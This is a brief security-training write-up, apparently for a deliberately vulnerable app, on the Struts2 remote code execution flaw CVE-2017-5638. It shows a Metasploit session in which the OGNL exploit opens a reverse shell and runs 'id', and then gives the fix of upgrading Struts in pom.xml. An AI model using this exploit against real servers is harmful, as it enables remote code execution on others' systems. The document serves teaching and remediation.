# Using Components with Known Vulnerability

The version of struts2 used in the application is vulnerable to a remote code execution vulnerability CVE-2017-5638. This vulnerability can be exploited to execute arbitrary code on the system hosting the application.

```
msf exploit(struts2_content_type_ognl) > exploit

[*] Started reverse TCP handler on 127.0.0.1:4444
[*] Command shell session 1 opened (127.0.0.1:4444 -> 127.0.0.1:57204) at 2017-08-09 14:01:53 +0530

id
uid=501(user) gid=20(staff) groups=20(staff)
```

## Solution

The issue exists due to a vulnerable version of Struts2 being used in the application. The advisory suggests that this vulnerability is fixed in Struts version 2.3.32 and 2.5.10.1 onwards. The version of struts2 can be updated in the application by changing in _pom.xml_ file:

```xml
<properties>
        <struts2.version>2.3.32</struts2.version>
        [...]
</properties>
```

## Reference

* [https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638)



